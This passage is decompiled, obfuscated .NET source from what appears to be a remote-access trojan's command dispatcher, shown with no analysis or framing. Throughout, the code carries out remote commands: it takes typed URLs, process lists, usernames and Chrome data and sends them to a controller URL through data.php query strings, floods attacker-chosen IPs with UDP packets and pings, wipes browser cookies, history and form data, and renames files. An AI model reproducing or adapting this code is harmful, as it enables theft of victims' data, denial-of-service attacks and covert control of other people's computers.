							NewLateBinding.LateCall((object)webClient8, (Type)null, "DownloadString", new object[1] { Operators.AddObject(Operators.AddObject(site, (object)"other/installed/data.php?action=write&data="), (object)val4.get_Text()) }, (string[])null, (Type[])null, (bool[])null, true);
						}
						if (Operators.CompareString(array[1], "startsaver", false) == 0)
						{
							StartScreenSaver(ttwtmhrnljdkjyujmlf: true);
						}
						if (Operators.CompareString(array[1], "stopsaver", false) == 0)
						{
							StartScreenSaver(ttwtmhrnljdkjyujmlf: false);
						}
						if (Operators.CompareString(array[1], "leftmouse", false) == 0)
						{
							mouse_event(MouseEventFlags.LeftDown, 0, 0, 0, 0);
							mouse_event(MouseEventFlags.LeftUp, 0, 0, 0, 0);
						}
						if (Operators.CompareString(array[1], "midlemouse", false) == 0)
						{
							mouse_event(MouseEventFlags.MiddleDown, 0, 0, 0, 0);
							mouse_event(MouseEventFlags.MiddleUp, 0, 0, 0, 0);
						}
						if (Operators.CompareString(array[1], "rightmouse", false) == 0)
						{
							mouse_event(MouseEventFlags.RightDown, 0, 0, 0, 0);
							mouse_event(MouseEventFlags.RightUp, 0, 0, 0, 0);
						}
						if (Operators.CompareString(array[1], "last25sites", false) == 0)
						{
							string name = "Software\\Microsoft\\Internet Explorer\\TypedURLs";
							RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey(name);
							string text15 = null;
							int num3 = 1;
							while (true)
							{
								string name2 = "url" + num3;
								string text16 = (string)registryKey2.GetValue(name2);
								if (text16 == null)
								{
									break;
								}
								text15 = text15 + "\r\n" + text16;
								num3++;
							}
							WebClient webClient9 = new WebClient();
							NewLateBinding.LateCall((object)webClient9, (Type)null, "DownloadString", new object[1] { Operators.AddObject(Operators.AddObject(site, (object)"data.php?action=write&data="), (object)text15) }, (string[])null, (Type[])null, (bool[])null, true);
						}
						if (Operators.CompareString(array[1], "writeprocesses", false) == 0)
						{
							string text17 = "";
							Process[] processes = Process.GetProcesses();
							foreach (Process process4 in processes)
							{
								text17 = process4.ProcessName + "|" + Conversions.ToString(process4.Id) + "|" + Conversions.ToString(process4.SessionId) + "|" + process4.MainWindowTitle + "\r\n" + text17;
							}
							WebClient webClient10 = new WebClient();
							NewLateBinding.LateCall((object)webClient10, (Type)null, "DownloadString", new object[1] { Operators.ConcatenateObject(Operators.ConcatenateObject(site, (object)"other/process/data.php?action=write&data="), (object)text17) }, (string[])null, (Type[])null, (bool[])null, true);
						}
						if (Operators.CompareString(array[1], "flip2screen", false) == 0)
						{
							lazkxsywazpggvneip hpawlshelulgrxlknm = NativeMethods.issjjylkiywxe();
							doatjtoymld(ref hpawlshelulgrxlknm);
							hpawlshelulgrxlknm.arvkvyjyzcvbvugajohsymspvzronwkmusmnvhahetzie = 2;
							ChangeSettings(hpawlshelulgrxlknm);
						}
						if (Operators.CompareString(array[1], "flipnoscreen", false) == 0)
						{
							lazkxsywazpggvneip hpawlshelulgrxlknm2 = NativeMethods.issjjylkiywxe();
							doatjtoymld(ref hpawlshelulgrxlknm2);
							hpawlshelulgrxlknm2.arvkvyjyzcvbvugajohsymspvzronwkmusmnvhahetzie = 0;
							ChangeSettings(hpawlshelulgrxlknm2);
						}
						if (Operators.CompareString(array[1], "changewallpaper", false) == 0)
						{
							tfuvubyxfobpiczfubi(array[2]);
						}
						if (Operators.CompareString(array[1], "2responsestart", false) == 0)
						{
							WebClient webClient11 = new WebClient();
							NewLateBinding.LateCall((object)webClient11, (Type)null, "DownloadString", new object[1] { Operators.ConcatenateObject(Operators.ConcatenateObject(site, (object)"other/response/data.php?action=write&data="), (object)Environment.UserName) }, (string[])null, (Type[])null, (bool[])null, true);
						}
						if (Operators.CompareString(array[1], "clearcookies", false) == 0)
						{
							Interaction.Shell("RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 2", (AppWinStyle)0, false, -1);
						}
						if (Operators.CompareString(array[1], "clearhistory", false) == 0)
						{
							Interaction.Shell("RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 1", (AppWinStyle)0, false, -1);
						}
						if (Operators.CompareString(array[1], "clearformdata", false) == 0)
						{
							Interaction.Shell("RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 16", (AppWinStyle)0, false, -1);
						}
						if (Operators.CompareString(array[1], "cleartempdata", false) == 0)
						{
							Interaction.Shell("RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 8 ", (AppWinStyle)0, false, -1);
						}
						if (Operators.CompareString(array[1], "rename", false) == 0)
						{
							DirectoryInfo directoryInfo = new DirectoryInfo(array[2]);
							if (directoryInfo.get_Exists())
							{
								directoryInfo.MoveTo(array[3]);
							}
							FileInfo fileInfo2 = new FileInfo(array[2]);
							if (fileInfo2.get_Exists())
							{
								FileInfo fileInfo3 = new FileInfo(array[2]);
								fileInfo3.MoveTo(array[3]);
							}
						}
						if (Operators.CompareString(array[1], "changeresolution", false) == 0)
						{
							changeRes(Conversions.ToInteger(array[2]), Conversions.ToInteger(array[3]));
						}
						if (Operators.CompareString(array[1], "startudpflood", false) == 0)
						{
							try
							{
								int num4 = Conversions.ToInteger(array[4]);
								int num5 = num4;
								for (int n = 0; n <= num5; n++)
								{
									UdpClient udpClient = new UdpClient();
									byte[] array10 = new byte[0];
									IPAddress addr = IPAddress.Parse(array[2]);
									udpClient.Connect(addr, Conversions.ToInteger(array[3]));
									array10 = Encoding.ASCII.GetBytes("VUZKRYoPOeUXPnRvtbQkbSfpYYMMmvIkEjHZlZWRigDmwDyLccyzJgOrHntNVLqlmkpaTaFfRhknfFhMwrgBrivGpocOpMYmUlXbCpnhzwToOTQbetPQZjeIXqKdYNsCDBGqjqVihxCEvVkcNuwRtyMXrFseGcbDkCosSsExQNjGeWSeuKfTczuYaHagodJSTRWtzIlyxOSUMlBsdLNiLPdZIWuvWfrUnSqJiJUOgPmWgmiuLahjsQLoqXdwFuaVVUZKRYoPOeUXPnRvtbQkbSfpYYMMmvIkEjHZlZWRigDmVUZKRYoPOeUXPnRvtbQkbSfpYYMMmvIkEjHZlZWRigDmwDyLccyzJgOrHntNVLqlmkpaTaFfRhknfFhMwrgBrivGpocOpMYmUlXbCpnhzwToOTQbetPQZjeIXqKdYNsCDBGqjqVihxCEvVkcNuwRtyMXrFseGcbDkCosSsExQNjGeWSeuKfTczuYaHagodJSTRWtzIlyxOSUMlBsdLNiLPdZIWuvWfrUnSqJiJUOgPmWgmiuLahjsQLoqXdwFuaVVUZKRYoPOeUXPnRvtbQkbSfpYYMMmvIkEjHZlZWRigDmVUZKRYoPOeUXPnRvtbQkbSfpYYMMmvIkEjHZlZWRigDmwDyLccyzJgOrHntNVLqlmkpaTaFfRhknfFhMwrgBrivGpocOpMYmUlXbCpnhzwToOTQbetPQZjeIXqKdYNsCDBGqjqVihxCEvVkcNuwRtyMXrFseGcbDkCosSsExQNjGeWSeuKfTczuYaHagodJSTRWtzIlyxOSUMlBsdLNiLPdZIWuvWfrUnSqJiJUOgPmWgmiuLahjsQLoqXdwFuaVVUZKRYoPOeUXPnRvtbQkbSfpYYMMmvIkEjHZlZWRigDmVUZKRYoPOeUXPnRvtbQkbSfpYYMMmvIkEjHZlZWRigDmwDyLccyzJgOrHntNVLqlmkpaTaFfRhknfFhMwrgBrivGpocOpMYmUlXbCpnhzwToOTQbetPQZjeIXqKdYNsCDBGqjqVihxCEvVkcNuwRtyMXrFseGcbDkCosSsExQNjGeWSeuKfTczuYaHagodJSTRWtzIlyxOSUMlBsdLNiLPdZIWuvWfrUnSqJiJUOgPmWgmiuLahjsQLoqXdwFuaVVUZKRYoPOeUXPnRvtbQkbSfpYYMMmvIkEjHZlZWRigDm");
									udpClient.Send(array10, 20000);
								}
							}
							catch (Exception projectError6)
							{
								ProjectData.SetProjectError(projectError6);
								ProjectData.ClearProjectError();
							}
						}
						if (Operators.CompareString(array[1], "startping", false) == 0)
						{
							Interaction.Shell("ping.exe -l " + array[3] + " -n " + array[3] + " " + array[2], (AppWinStyle)0, false, -1);
						}
						if (Operators.CompareString(array[1], "f2i2f", false) == 0)
						{
							WebClient webClient12 = new WebClient();
							NewLateBinding.LateCall((object)webClient12, (Type)null, "DownloadString", new object[1] { Operators.AddObject(Operators.AddObject(site, (object)"other/fif/data.php?action=write&data="), uittgcohxmlrj(array[2])) }, (string[])null, (Type[])null, (bool[])null, true);
						}
						if (Operators.CompareString(array[1], "getchromedata", false) == 0)
						{
							WebClient webClient13 = new WebClient();
							NewLateBinding.LateCall((object)webClient13, (Type)null, "DownloadString", new object[1] { Operators.AddObject(Operators.AddObject(site, (object)"data.php?action=write&data="), wigenzzvovostmhm()) }, (string[])null, (Type[])null, (bool[])null, true);
							return result;
						}
						return result;
					}
					return result;
				}
				return result;
			}
			catch (Exception projectError7)
			{
				ProjectData.SetProjectError(projectError7);
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}
}
